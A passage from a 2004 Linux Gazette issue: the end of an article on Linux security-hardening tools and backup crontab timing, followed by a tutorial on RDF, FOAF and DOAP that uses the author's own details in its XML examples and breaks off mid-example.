<strong>Other Security Utilities</strong> 

<ul>
<li><a href=
"http://www.bastille-linux.org/">http://www.bastille-linux.org/</a>
- Bastille attempts to &quot;harden&quot; or &quot;tighten&quot; Unix/Linux operating
systems. It does much of what I have enumerated above and more
besides.</li>

<li><a href="http://www.lids.org/">http://www.lids.org/</a> - The
Linux Intrusion Defense System is a kernel patch and administration tool
which enhances the kernel's security by implementing Mandatory
Access Control.</li>

<li><a href=
"http://www.chkrootkit.org">http://www.chkrootkit.org</a> -
<code>chkrootkit</code> is a tool to locally check for signs of a
rootkit (a set of tools that attackers can use to hide their
tracks)</li>

<li><a href="http://www.nessus.org/">http://www.nessus.org/</a> - A
free, powerful, up-to-date and easy to use remote security scanner;
a security scanner is a software which will audit remotely a given
network and determine whether someone (or something - like a worm)
may break into it, or misuse it in some way.</li>
</ul>

<h3>A Note on Last Month's Article</h3>

Thomas Adam pointed out a potential conflict in my article last
month (&quot;<a href="http://linuxgazette.net/104/odonovan.html">
Automatic Backups with rsync and Anacron</a>&quot;, Linux Gazette 
#104). In the article I had crontabs such as: 

<pre>
00 02 * * * rsync -r -e ssh --delete /home/username/mail
username@mycomputer.mycompany.com:/backups/mail
...
</pre>

Thomas rightfully informed me that &quot;this could cause a few issues
if one is already running some kind of &quot;ntp&quot; check, since the task
running at precisely 02:00 could clock skew. This would cause the
scheduled rsync process above to get reloaded by cron multiple
times or even not at all. Therefore, it is best to offset the time
to either a few minutes before the hour, or a few minutes
afterwards.&quot;

<p>Thanks for pointing that out. And, as always, I welcome all
feedback, compliments and criticism. You'll find my e-mail by
clicking on my name at the top of this article.</p>

<h3>Next month:</h3>

The ins and outs of Tripwire.


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<p>
<! -- REPLACE THE FOLLOWING WITH AUTHOR'S ~200x200 PIC. -->
<img align="left" alt="[BIO]" src="../gx/authors/odonovan.jpg" class="bio">
<em>

<! -- BIO GOES HERE -->

Barry O'Donovan graduated from the National University of Ireland, Galway
with a B.Sc. (Hons) in computer science and mathematics. He is currently
completing a Ph.D. in computer science with the <a
href="http://www.ihl.ucd.ie/">Information Hiding Laboratory</a>, University
College Dublin, Ireland in the area of audio watermarking.

<p> Barry has been using Linux since 1997 and his current flavor of choice
is Fedora Core. He is a member of the <a href="http://www.linux.ie/">Irish
Linux Users Group</a>. Whenever he's not doing his Ph.D. he can usually be
found supporting his finances by doing some work for <a 
href="http://www.openhosting.ie/" title="An Irish based web hosting and web 
design company">Open Hosting</a>, in the pub with friends or running in the local 
park.
</em>
<br clear="all">
<!-- *** END bio *** -->


<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/odonovan.html">Barry O'Donovan</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="oregan"></a>
<h1>RDF and the Semantic Web</h1>
<p id="by"><b>By <A HREF="../authors/oregan.html">Jimmy O'Regan</A></b></p>


</b>
</p>


<p>
<p> RDF is a framework for defining metadata; data that describes data.
It was developed by the W3C, based on work by <a
 href="http://wp.netscape.com/columns/techvision/innovators_rg.html">Ramanathan
V. Guha</a>, and was originally used in Netscape Navigator 4.5's <a
 href="http://wp.netscape.com/communicator/navigator/smart.html">Smart
Browsing</a> ("What's related?") feature, and by <a
 href="http://dmoz.org">Open Directory</a>. RDF followed from work
Guha had done earlier, both on the <a href="http://www.cyc.com">Cyc</a>
project, and on Apple's Hotsauce project. </p>

<p> RDF is currently being used in several areas: <a
 href="http://www.musicbrainz.org/">MusicBrainz</a> uses it to provide
playlist information about albums and songs, as a replacement for formats such
as WinAmp's M3U files, or Microsoft's ASX files; Mozilla uses it for
several purposes, e.g. recording the details of downloaded files (<a
 href="misc/oregan/downloads.rdf.txt">sample</a>), remembering which
action to perform for each MIME type, and so on. RDF is also used in some
variants of RSS to provide details about syndicated articles.
</p>
<p> RDF is a key component of the <a href="http://www.w3.org/2001/sw/">Semantic
Web</a>. In a May 2001 <a
 href="http://www.sciam.com/article.cfm?articleID=00048144-10D2-1C70-84A9809EC588EF21&amp;catID=2">article
in Scientific American</a>, Tim Berners-Lee et al. described this concept:
</p>
<blockquote>The Semantic Web is an extension of the current web where
information is given well-defined meaning, better enabling computers
and people to work in cooperation.
</blockquote>

<p> The Semantic Web is the next "big deal" for the Web: the W3C is developing
several technologies, based around RDF, which provide a machine-readable way
of representing metadata. Various schema are already in existence: <a
 href="http://web.resource.org/rss/1.0/spec">RSS 1.0</a>, for
summarising the contents of a website (though RSS is mostly used by
news sites to provide a "feed" of the news they provide); <a
 href="http://www.w3.org/TR/owl-ref/">OWL</a>, which provides a basis
for creating new schema while providing compatibility with similar
schema; <a href="http://www.foaf-project.org/">FOAF</a>, which
provides a way of describing people and the relationships between them.
There are several others as well. Edd Dumbill has even proposed that
file metadata in GNOME be represented in RDF. <br>
</p>

<h2>A brief history of RDF</h2>

<p> <a href="http://en.wikipedia.org/wiki/Cyc">Cyc</a> is a project to
create an artificial intelligence with basic "common sense". It has a
large database containing definitions such as: a tree is a kind of
plant, a sycamore is a kind of tree, and so on. Cyc is then able to
deduce from these definitions that a sycamore is a plant. Though work
continues on a commercial version of Cyc, an open source version, <a
 href="http://www.opencyc.org">OpenCyc</a>, is also available.
</p>
<p> Hotsauce was a browser plug-in created by Apple in 1996 that allowed
users to use 3D navigation on a website that included an <a
 href="http://www.xspace.net/hotsauce/mcf.html">MCF</a> definition.
MCF, Meta Content Framework, was a text-based definition that used an <a
 href="http://www.faqs.org/rfcs/rfc822.html">RFC822</a>-style format to
describe a site. Following the <a
 href="http://www.xspace.net/hotsauce/example.html">examples</a> I
found on the net, I've created an <a href="misc/oregan/lg.mcf.txt">
example of my own</a> that describes a simple site layout.</p>

<p> When Guha <a
 href="http://developer.netscape.com/docs/technote/metadata/metadata.htm">moved
to Netscape</a>, he met with Tim Bray, co-author of XML 1.0, and the
two worked on creating an XML-based version of MCF, <a
 href="http://www.w3.org/TR/NOTE-MCF-XML/">submitted to the W3C</a> in
May 1997. (I've created a <a href="misc/oregan/lg.mcf-xml.txt">simple
example</a> of this too).</p>
<p> With the addition of <a href="http://www.w3.org/TR/REC-xml-names/">name
spaces</a> to XML, RDF began to take its current form. RDF uses XML name spaces
to extend its vocabulary using <a
 href="http://www.w3.org/TR/rdf-schema/">RDF
schema</a>, though it's worth noting that although XML is the most common
container format for RDF, other formats are in use. The W3C uses another
format called N3 (Notation3), which bears greater resemblance to LISP-style
languages, such as CycL and <a
 href="http://logic.stanford.edu/kif/kif.html">KIF</a>.
</p>

<p> RDF schema separate the RDF metadata - definitions of how new
terms relate to each other - from the "normal" metadata. Instead of
defining the relationships among items, such as "A is a child of B, and
is a kind of C", as was done in MCF and MCF-XML, these are defined in
separate schema, which may be referred to using XML name spaces and reused
(though it is still possible to include schema within the document).
</p>

<h3>RDF Statements</h3>

<p>Anyone interested in learning about RDF would do well to read the
W3C's <a href="http://www.w3.org/TR/rdf-primer/">RDF Primer</a> and/or
<a href="http://www.betaversion.org/%7Estefano/linotype/news/57/">"A
no-nonsense guide to Semantic Web specs for XML people"</a>, but I'll
give my best attempt to explain the concepts.<br>
</p>

<p>Each RDF statement is called a "triple", meaning it consists of
three parts: subject, predicate, and object; the subject is either an
RDF URI, or a blank node (I haven't seen a good explanation why these
nodes are "blank", so I'll just refer to them as nodes). So, rephrasing
the sentence "Linux Gazette is the name of the website at
http://linuxgazette.net" looks like this:
</p>
<pre class="code">
<b>http://linuxgazette.net</b> has the property <b>name</b> with the value <b>"Linux Gazette"</b>
</pre>
<p> Predicates may only be RDF URIs - references to a schema definition of the
property - while objects may be URIs, blank nodes, or literals. We can then
express the previous triple as an N-Triple, which is the simplest valid form
of RDF, like this:
</p>
<pre class="code">
# Note that each URI most be enclosed, and each triple must end with a '.'
&lt;http://linuxgazette.net&gt;  &lt;http://example.org/sample#name&gt; "Linux Gazette".
</pre>

In XML, the general style is:<br>
<pre class="code">
&lt;?xml version="1.0"?&gt;
&lt;rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;

&lt;rdf:Description rdf:about="<span style="font-weight: bold;">subject</span>"&gt;
  &lt;<b>predicate</b>&gt;<b>Object</b>&lt;<b>/predicate</b>&gt;
&lt;/rdf:Description&gt;

&lt;/rdf:RDF&gt;
</pre>
so, using XML QNames, which are valid URIs, our example becomes:<br>
<pre class="code">
&lt;?xml version="1.0"?&gt;
&lt;rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
        xmlns:example="http://example.org/sample#"&gt;
	
&lt;rdf:Description rdf:about="http://linuxgazette.net"&gt;
 &lt;example:name&gt;Linux Gazette&lt;/example:name&gt;
&lt;/rdf:Description&gt;

&lt;/rdf:RDF&gt;
</pre>
RDF allows multiple properties to be abbreviated by including them
within the same set of tag, so:<br>
<pre class="code">
&lt;rdf:Description rdf:about="http://linuxgazette.net"&gt;
  &lt;example:name&gt;Linux Gazette&lt;/example:name&gt;
&lt;/rdf:Description&gt;

&lt;rdf:Description rdf:about="http://linuxgazette.net"&gt;
  &lt;example:nickname&gt;LG&lt;/example:nickname&gt;
&lt;/rdf:Description&gt;
</pre>
is the same as:<br>
<pre class="code">
&lt;rdf:Description rdf:about="http://linuxgazette.net"&gt;
  &lt;example:name&gt;Linux Gazette&lt;/example:name&gt;
  &lt;example:nickname&gt;LG&lt;/example:nickname&gt;
&lt;/rdf:Description&gt;
</pre>
I've said that objects can be nodes: a quick example of this is:<br>
<pre class="code">
&lt;rdf:Description rdf:about="http://linuxgazette.net"&gt;
  <b>&lt;example:editor&gt;</b>
   <b>&lt;example:name&gt;Ben Okopnik&lt;/example:name&gt;</b>
  <b>&lt;/example:editor&gt;</b>
&lt;/rdf:Description&gt;
</pre>
These nodes can be given identifiers, and referred to by identifier,
for clarity:<br>
<pre class="code">
&lt;rdf:Description rdf:about="http://linuxgazette.net"&gt;
  <b>&lt;example:editor rdf:nodeID="ben"/&gt;</b>
&lt;/rdf:Description&gt;
<br>
<b>&lt;rdf:Description rdf:nodeID="ben"&gt;</b>
  <b>&lt;example:name&gt;Ben Okopnik&lt;/example:name&gt;</b>
<b>&lt;/rdf:Description&gt;</b>
</pre>
<h3>FOAF<br>
</h3>
<p><a href="http://xmlns.com/foaf/0.1/">FOAF</a> stands for "Friend of
a Friend". FOAF was designed as a way to
represent information about people online, and the relationships
between them. E-mail addresses are used as identifiers, though given
how much spam we all seem to receive these days, it is also possible to
use a sha1sum of an e-mail address, or both.<br>
</p>
<p>FOAF is being used by sites such as <a href="http://beta.plink.org/">plink</a>
("People Link") where people can meet each other, and sites like
LiveJournal generate FOAF so that users can have their relationships
automatically described. There is also <a
 href="http://www.sharedid.com/sharedid/">SharedID</a>, which is
attempting to build a Single Sign-On Service based on FOAF.<br>
</p>
<p>Rather than talk about it in nauseating detail, I'll show a simple
example, which should be relatively self-explanatory. (<a 
href="misc/oregan/foaf-example.rdf.txt">This</a> is based on an
<a href="misc/oregan/foaf-a-matic.rdf.txt">example</a> generated by <a
href="http://www.ldodds.com/foaf/foaf-a-matic">FOAF-a-matic</a>).
</p>
<pre class="code">
&lt;rdf:RDF
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
     xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
     xmlns:foaf="http://xmlns.com/foaf/0.1/"&gt;
     
&lt;foaf:Person rdf:nodeID="jimregan"&gt;
&lt;foaf:name&gt;Jimmy O'Regan&lt;/foaf:name&gt;
&lt;foaf:title&gt;Mr.&lt;/foaf:title&gt;
&lt;foaf:givenname&gt;Jimmy&lt;/foaf:givenname&gt;
&lt;foaf:family_name&gt;O'Regan&lt;/foaf:family_name&gt;
&lt;foaf:nick&gt;jimregan&lt;/foaf:nick&gt;

&lt;foaf:mbox rdf:resource="mailto:jimregan@o2.ie"/&gt;
&lt;foaf:mbox_sha1sum&gt;9642c26da203ef143f884488d49194eb0747547c&lt;/foaf:mbox_sha1sum&gt;

&lt;foaf:homepage
rdf:resource="http://linuxgazette.net/authors/oregan.html"/&gt;
&lt;foaf:depiction
rdf:resource="http://linuxgazette.net/gx/authors/oregan.jpg"/&gt;
&lt;foaf:phone rdf:resource="tel:+353872441159"/&gt;

&lt;foaf:knows&gt;
  &lt;foaf:Person&gt;
    &lt;foaf:name&gt;Mark Hogan&lt;/foaf:name&gt;
    &lt;foaf:mbox_sha1sum&gt;7dbf56320b204be2e2bee161abed3ffc5825b590&lt;/foaf:mbox_sha1sum&gt;
  &nbsp; &lt;/foaf:Person&gt;
&lt;/foaf:knows&gt;

&lt;/foaf:Person&gt;

&lt;/rdf:RDF&gt;
</pre>

<p>Most elements in FOAF can be added as many times as you like - many
of us have several e-mail addresses, homepages, etc.<br>
</p>

<p>Anything you add to your own <tt>&lt;foaf:Person&gt;</tt> definition, you 
can add to any other node within a <tt>&lt;foaf:knows&gt;</tt> node.
</p>

<pre class="code">
&lt;foaf:knows&gt;
&lt;foaf:Person&gt;
&lt;foaf:name&gt;Mark Hogan&lt;/foaf:name&gt;
&lt;foaf:mbox_sha1sum&gt;7dbf56320b204be2e2bee161abed3ffc5825b590&lt;/foaf:mbox_sha1sum&gt;
<b>&lt;foaf:nick&gt;Sprogzilla&lt;/foaf:nick&gt;</b>
<b>&lt;foaf:dateOfBirth&gt;1997-06-29&lt;/foaf:dateOfBirth&gt;</b>
&lt;/foaf:Person&gt;
&lt;/foaf:knows&gt;
</pre>
<p>
</p>
<h3>More Detail<br>
</h3>
<p>There are quite a lot of things you can describe using FOAF, from
the useful to the amusing (such as the <tt>&lt;foaf:dnaChecksum&gt;</tt> tag).
Let's add a few of the more useful items, such as those <a
href="misc/oregan/lj-foaf.rdf.txt">generated by LiveJournal</a>:
</p>
<pre class="code">
&lt;foaf:workplaceHomepage rdf:resource="http://www.dewvalley.com"/&gt;
&lt;foaf:schoolHomepage rdf:resource="http://www.lit.ie"/&gt;
&lt;foaf:schoolHomepage rdf:resource="http://www.gairmscoilmhuirethurles.ie/"/&gt;
&lt;foaf:dateOfBirth&gt;1979-07-31&lt;/foaf:dateOfBirth&gt;

&lt;!-- Generated by LiveJournal --&gt;
&lt;foaf:page&gt;
  &lt;foaf:Document rdf:about="http://www.livejournal.com/userinfo.bml?user=jimregan"&gt;
  &lt;dc:title&gt;LiveJournal.com Profile&lt;/dc:title&gt;
    &lt;dc:description&gt;
      Full LiveJournal.com profile, including information such as interests 
      and bio.
    &lt;/dc:description&gt;
  &lt;/foaf:Document&gt;
&lt;/foaf:page&gt;

&lt;foaf:weblog rdf:resource="http://www.livejournal.com/users/jimregan/"/&gt;

&lt;foaf:interest dc:title="charles dickens" rdf:resource="http://www.livejournal.com/interests.bml?int=charles+dickens"/&gt;
&lt;foaf:interest dc:title="foaf" rdf:resource="http://www.livejournal.com/interests.bml?int=foaf" /&gt;
&lt;foaf:interest dc:title="guitar" rdf:resource="http://www.livejournal.com/interests.bml?int=guitar" /&gt;
&lt;foaf:interest dc:title="linux" rdf:resource="http://www.livejournal.com/interests.bml?int=linux" /&gt;
&lt;foaf:interest dc:title="linux gazette" rdf:resource="http://www.livejournal.com/interests.bml?int=linux+gazette" /&gt;
&lt;foaf:interest dc:title="neal stephenson" rdf:resource="http://www.livejournal.com/interests.bml?int=neal+stephenson" /&gt;
&lt;foaf:interest dc:title="open source" rdf:resource="http://www.livejournal.com/interests.bml?int=open+source" /&gt;
&lt;foaf:interest dc:title="terry pratchett" rdf:resource="http://www.livejournal.com/interests.bml?int=terry+pratchett" /&gt;
&lt;foaf:interest dc:title="wikipedia" rdf:resource="http://www.livejournal.com/interests.bml?int=wikipedia" /&gt;
</pre>
<p>The <tt>&lt;dc:title&gt;</tt> and <tt>&lt;dc:description&gt;</tt> tags are 
from the Dublin Core schema, so we would have to change our namespace
definitions to add the url:
</p>
<pre class="code">
&lt;rdf:RDF
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
     xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
     xmlns:foaf="http://xmlns.com/foaf/0.1/"
     <b>xmlns:dc="http://purl.org/dc/elements/1.1/"</b>&gt;
</pre>
<p>There are also several ways of identifying various chat accounts you
have online:<br>
</p>
<pre class="code">
&lt;foaf:jabberID&gt;jimregan@jabber.org&lt;/foaf:jabberID&gt;
&lt;foaf:icqChatID&gt;113804615&lt;/foaf:icqChatID&gt;
</pre>
<p>and many other, miscellaneous details.</p>

<p>Now, that's all well and good, but what about the less useful stuff?
FOAF has tags to add silly things like Myers-Briggs personality types,
geekcode blocks, and .plan information:
</p>

<pre class="code">
&lt;foaf:myersBriggs&gt;ENTP&lt;/foaf:myersBriggs&gt;
&lt;foaf:geekCode&gt;
GCS/IT/MU/TW/O d-(+)&gt;--- s: a--(-) C++(+++)&gt;++++$
UBLAC++(on)&gt;++++$ P++(+++)&gt;++++ L+++&gt;++++$ E+(+++) W+++&gt;$
N+ o K++ w(++)&gt;-- O- M !V PS+(+++) PE(--) Y+&gt;++ PGP-(+)&gt;+++
t+() !5 X+ !R tv+ b++(+++)&gt;++++$ DI++++ D++ G e h r-
y--**(++++)&gt;+++++
&lt;/foaf:geekCode&gt;
&lt;foaf:plan&gt;Get a better job&lt;/foaf:plan&gt;
</pre>

<h3>Other Schema</h3>
<p>FOAF contains a lot of useful and amusing stuff, but there are many
other schemas waiting to be used.
</p>

<p>On the amusing side:</p>
<pre class="code">
&lt;rdf:RDF
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
     xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
     xmlns:foaf="http://xmlns.com/foaf/0.1/"
     <b>xmlns:zodiac="http://www.ideaspace.net/users/wkearney/schema/astrology/0.1#"</b>
     <b>xmlns:quaff="http://purl.org/net/schemas/quaffing/"</b>&gt;

<b>&lt;zodiac:Sign&gt;Leo&lt;/zodiac:Sign&gt;</b>

&lt;quaff:owesBeerTo rdf:nodeID="doyle"/&gt;
&lt;quaff:drankBeerWith rdf:nodeID="doyle"/&gt;

&lt;foaf:knows&gt;
&lt;foaf:Person rdf:nodeID="doyle"&gt;
&lt;foaf:name&gt;Jimmy Doyle&lt;/foaf:name&gt;
&lt;foaf:mbox_sha1sum&gt;a0610d4a3086354b9ef1daf50d24de232115c965&lt;/foaf:mbox_sha1sum&gt;
&lt;/foaf:Person&gt;
&lt;/foaf:knows&gt;
</pre>
<p>There are also more useful external schema - geo, to describe the
location of a place; and srw to describe the languages you speak, read,
write, and master.</p>
<pre class="code">
&lt;rdf:RDF
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
     xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
     xmlns:foaf="http://xmlns.com/foaf/0.1/"
     <b>xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"</b>
     <b>xmlns:srw="http://purl.org/net/inkel/rdf/schemas/lang/1.1#"</b>&gt;

<b>
&lt;foaf:based_near&gt;
  &lt;geo:Point&gt;
    &lt;geo:lat&gt;52.6796&lt;/geo:lat&gt;
    &lt;geo:long&gt;-7.8221&lt;/geo:long&gt;
  &lt;/geo:Point&gt;
&lt;/foaf:based_near&gt;

&lt;srw:masters&gt;en&lt;/srw:masters&gt;
&lt;srw:reads&gt;fr&lt;/srw:reads&gt;
&lt;srw:reads&gt;ga&lt;/srw:reads&gt;
</b>
</pre>
<p> One of the cool things you can do with geographic locations is to run <a
 href="http://www.emacswiki.org/cgi-bin/alex/download/FoafGeoGraph">FoafGeoGraph</a>
on your FOAF file. This looks for geographic locations for people, or
for links to their FOAF files, from which it generates input for
XPlanet which can be used to show your position relative to those of
your friends. Nifty, eh?

<p> You can also refer to other documents (though this is part of RDF). For
example, there's a schema that represents <a href="http://www.w3.org/2002/12/cal/">iCalendar data in RDF</a>.
Using this, I can provide my <a href="misc/oregan/work.ics.txt">work timetable</a>
and <a href="misc/oregan/birthdays.ics.txt">some birthdays</a> from my foaf
file (<a href="misc/oregan/work.cal.rdf.txt">work.cal.rdf.txt</a> and <a 
href="misc/oregan/birthdays.cal.rdf.txt">birthdays.cal.rdf.txt</a>, generated
with <a href="misc/oregan/ical2rdf.pl.txt">this</a> Perl script, which I've
lost the link for):

<pre class="code">
&lt;rdfs:seeAlso rdf:resource="http://linuxgazette.net/misc/oregan/work.cal.rdf.txt" dc:title="Work schedule"/&gt;
&lt;rdfs:seeAlso rdf:resource="http://linuxgazette.net/misc/oregan/birthdays.cal.rdf.txt" dc:title="Birthdays"/&gt;
</pre>

I've already mentioned that it's possible to depict chat accounts with services
such as Jabber, and MSN. It's also possible to represent other accounts. Chat
accounts which don't have a specific tag available can still be represented,
using the <tt>&lt;foaf:OnlineChatAccount&gt;</tt> tag, while other accounts
use the <tt>&lt;foaf:OnlineAccount&gt;</tt> tag.

<pre class="code">
&lt;foaf:holdsAccount&gt;
  &lt;foaf:OnlineChatAccount&gt;
    &lt;foaf:accountName&gt;jimregan&lt;/foaf:accountName&gt;
    &lt;foaf:accountServiceHomepage dc:title="irc.freenode.net" rdf:resource="http://www.freenode.net/irc_servers.shtml" /&gt;
  &lt;/foaf:OnlineChatAccount&gt;
&lt;/foaf:holdsAccount&gt;

&lt;foaf:holdsAccount&gt;
  &lt;foaf:OnlineAccount&gt;
    &lt;foaf:accountName&gt;jimregan&lt;/foaf:accountName&gt;    
    &lt;foaf:accountServiceHomepage dc:title="Wikipedia" rdf:resource="http://en.wikipedia.org" /&gt;
  &lt;/foaf:OnlineAccount&gt;
&lt;/foaf:holdsAccount&gt;
</pre>

<h3>Specifying a relationship</h3>

<p> FOAF was originally designed to described the way in which people were
related to each other, though this seems to have become unworkable. It's still
possible to convey this information though:

<pre class="code">
&lt;dcterms seems to be required by rel --&gt;
&lt;rdf:RDF
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
     xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
     xmlns:foaf="http://xmlns.com/foaf/0.1/"
     xmlns:dcterms="http://purl.org/dc/terms/"
     <b>xmlns:rel="http://purl.org/vocab/relationship/"</b>&gt;

<b>&lt;rel:parentOf rdf:nodeID="markinho"/&gt;</b>

&lt;foaf:knows&gt;
&lt;foaf:Person rdf:nodeID="markinho"&gt;
&lt;foaf:name&gt;Mark Hogan&lt;/foaf:name&gt;
&lt;foaf:mbox_sha1sum&gt;7dbf56320b204be2e2bee161abed3ffc5825b590&lt;/foaf:mbox_sha1sum&gt;
&lt;foaf:nick&gt;Sprogzilla&lt;/foaf:nick&gt;
&lt;foaf:dateOfBirth&gt;1997-06-29&lt;/foaf:dateOfBirth&gt;
&lt;rdfs:seeAlso rdf:resource="http://linuxgazette.net/105/misc/oregan/mark.rdf.txt"/&gt;
&lt;/foaf:Person&gt;
&lt;/foaf:knows&gt;
</pre>


<h3>Web of trust</h3>

<p> Identity theft is becoming more and more of an issue on the 'net. To
protect against this, there is a schema available which describes various
aspects of a PGP signature, and to allow a FOAF file to be digitally signed.

<p> (For more information on signing a FOAF document, see <a 
href="http://usefulinc.com/foaf/signingFoafFiles">Edd Dumbill's page</a>).

<pre class="code">
&lt;rdf:RDF
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
     xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
     xmlns:foaf="http://xmlns.com/foaf/0.1/"
     <b>xmlns:wot="http://xmlns.com/wot/0.1/"</b>&gt;

&lt;!-- Signature to verify this document --&gt;
&lt;foaf:Document rdf:about=""&gt;
  &lt;wot:assurance rdf:resource="foaf-example.rdf.asc" /&gt;
&lt;/foaf:Document&gt;

&lt;!-- my signature --&gt;
&lt;wot:pubkeyAddress
rdf:resource="http://linuxgazette.net/104/misc/oregan/jimregan.asc"/&gt;
&lt;wot:hex_id&gt; 773730F8&lt;/wot:hex_id&gt;
&lt;wot:length&gt;1024&lt;/wot:length&gt;
&lt;wot:fingerprint&gt;D675 279B 24AC BDC3 BAE9 BB7A 666C 30CA 7737 30F8&lt;/wot:fingerprint&gt;
</pre>

<h3>Co-Depiction.</h3>

<p><a href="http://rdfweb.org/2002/01/photo/">Co-depiction</a> is a hot
topic in FOAF circles. The logical extension
to saying you know someone is to prove it with a photo. Let's expand
the
first example to show a <a href="misc/oregan/IMAGE0004.jpg">co-depiction
of Mark and me</a>:
</p>

<pre class="code">
&lt;foaf:homepage rdf:resource="http://linuxgazette.net/authors/oregan.html"/&gt;
&lt;foaf:depiction rdf:resource="http://linuxgazette.net/gx/authors/oregan.jpg"/&gt;
<b>&lt;foaf:depiction rdf:resource="http://linuxgazette.net/105/misc/oregan/IMAGE0004.jpg"/&gt;</b>
&lt;foaf:phone rdf:resource="tel:+353872441159"/&gt;

&lt;foaf:knows&gt;
&lt;foaf:Person&gt;
&lt;foaf:name&gt;Mark Hogan&lt;/foaf:name&gt;
<b>&lt;foaf:depiction rdf:resource="http://linuxgazette.net/105/misc/oregan/IMAGE0004.jpg"/&gt;</b>
&lt;foaf:mbox_sha1sum&gt;7dbf56320b204be2e2bee161abed3ffc5825b590&lt;/foaf:mbox_sha1sum&gt;
&lt;/foaf:Person&gt;
&lt;/foaf:knows&gt;
</pre>

<p> Nothing special, just the same <tt>&lt;foaf:depiction&gt;</tt> tag in two
or more <tt>&lt;foaf:Person&gt;</tt> tags, which makes it easy for a computer 
to find where two people are co-depicted.
</p>

<p> The next step in co-depiction is going to be the addition of SVG
outlines, to show who is who in a photo, though unfortunately, no one
has yet come up with a way of referring to the SVG data in a computer
readable way. (SVG, as an XML-based format, is capable of including RDF
metadata without difficulty).

<p> Another problem is that SVG hasn't quite caught on yet, though the latest
version of KDE supports it, and future versions of Mozilla should support it.

<p>As it is, though, it can be useful to show humans who's who. Take <a
 href="misc/oregan/Mark_Adam.jpg">this picture</a>, which shows my son,
his friend Adam, and me in the background. In the future, it will be
possible to use an SVG image like <a href="misc/oregan/co.svg.txt">this</a>
- which contains an invisible outline, with some additional metadata, to give 
machine readable information, similar to HTML's image maps. 

<p> At the moment, we can use an image like <a
 href="misc/oregan/co-fill.svg.txt">this</a>, which contains the same outlines,
but is filled with separate colours for each person depicted, and simply say that 
Mark is represented by the green area, Adam by the red, and me by the blue.
(I use the <tt>svgdisplay</tt> program which comes with KSVG; those without
an SVG viewer can look at this <a href="misc/oregan/co-fill.png">PNG</a> to
see what I'm talking about).
</p>


<h3>DOAP</h3>

<p> <a href="http://usefulinc.com/doap">DOAP</a> stands for "Description of
a Project". DOAP is an RDF vocabulary, influenced by FOAF, which was
created by Edd Dumbill to provide details about an open source software
project. At the time of writing, DOAP, as a project, is one week old, and 
already has impressive momentum.

<p> DOAP is designed as a replacement for several different formats for
project description, such as that used by <a
 href="http://freshmeat.net/">Freshmeat</a> or the <a
 href="http://www.gnu.org/directory/">GNU Free Software Directory</a>,
which complements FOAF. Here's an example which describes LG, generated
using <a href="http://mouettes.balbinus.net/doap-a-matic.php">DOAP-a-matic</a>
(<a href="misc/oregan/lg.doap.txt">text version</a>):<br>
<br>
<pre class="code">
&lt;?xml version="1.0" encoding="iso-8859-15"?&gt;
&lt;rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" 
	 xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#" xmlns:doap="http://usefulinc.com/ns/doap#" 
	 xmlns:foaf="http://xmlns.com/foaf/0.1/" 
	 xmlns:admin="http://webns.net/mvcb/" 
	 xml:lang="en"&gt;
  &lt;rdf:Description rdf:about=""&gt;
    &lt;admin:generatorAgent rdf:resource="http://www.bonjourlesmouettes.org/doap-a-matic.php"/&gt;
  &lt;/rdf:Description&gt;
  &lt;doap:Project&gt;
    &lt;doap:name&gt;Linux Gazette&lt;/doap:name&gt;
    &lt;doap:shortname&gt;LG&lt;/doap:shortname&gt;
    &lt;doap:homepage rdf:resource="http://linuxgazette.net"/&gt;
    &lt;doap:created&gt;1995-07&lt;/doap:created&gt;
    &lt;doap:description&gt;
      Linux Gazette is a monthly Linux webzine, dedicated to providing a free 
      magazine for the Linux community and making Linux just a little more fun!
    &lt;/doap:description&gt;
    &lt;doap:shortdesc&gt;Linux Gazette is a monthly Linux webzine.&lt;/doap:shortdesc&gt;
    &lt;doap:mailing-list rdf:resource="http://linuxgazette.net/mailman/"/&gt;
    &lt;doap:programming-language&gt;HTML&lt;/doap:programming-language&gt;
    &lt;doap:os&gt;Linux&lt;/doap:os&gt;
    &lt;doap:license rdf:resource="http://linuxgazette.net/105/misc/oregan/OPL.rdf.txt"/&gt;
    &lt;doap:download-page rdf:resource="http://linuxgazette.net/ftpfiles/"/&gt;
    &lt;doap:download-mirror rdf:resource="http://www.tldp.org/LDP/LGNET/ftpfiles"/&gt;
    &lt;doap:maintainer&gt;
      &lt;foaf:Person&gt;
	&lt;foaf:name&gt;Ben Okopnik&lt;/foaf:name&gt;
	&lt;foaf:nick&gt;Ben&lt;/foaf:nick&gt;
	&lt;foaf:mbox_sha1sum&gt;30073b332dac6fc812dcdd806ac1e9715ceac46a&lt;/foaf:mbox_sha1sum&gt;
      &lt;/foaf:Person&gt;
    &lt;/doap:maintainer&gt;
  &lt;/doap:Project&gt;
&lt;/rdf:RDF&gt;
</pre>

<p> DOAP-a-matic doesn't have support for the OPL, the licence used by LG,
but it's simple to define a new one (<a href="misc/oregan/OPL.rdf.txt">text
version</a>):

<pre class="code">
&lt;rdf:RDF xmlns="http://web.resource.org/cc/"
